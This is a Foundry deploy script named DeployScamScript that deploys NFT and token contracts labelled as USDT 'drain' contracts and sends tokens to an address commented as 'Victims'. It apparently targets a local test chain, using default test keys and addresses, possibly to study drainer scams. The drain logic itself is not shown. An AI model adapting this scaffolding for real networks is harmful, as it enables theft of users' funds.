// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/NASNFTContractPayable.sol";
import "../src/NASNFTContractUSDTDrain.sol";
import "../src/NASTokenContract.sol";

contract DeployScamScript is Script {
    function run() public {
        vm.startBroadcast(0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d);

        NASNFTContractPayable c1 = new NASNFTContractPayable("https://ipfs.io/");

        // The address passed is the address of the USDT contract
        NASNFTContractUSDTDrain drain1 = new NASNFTContractUSDTDrain("https://ipfs.io/", address(0x5FbDB2315678afecb367f032d93F642f64180aa3));
        NASTokenContract drain2 = new NASTokenContract(address(0x5FbDB2315678afecb367f032d93F642f64180aa3));

        // Victims
        drain2.transfer__(address(0xa0Ee7A142d267C1f36714E4a8F75612F20a79720), 10000);

        vm.stopBroadcast();
    }
}
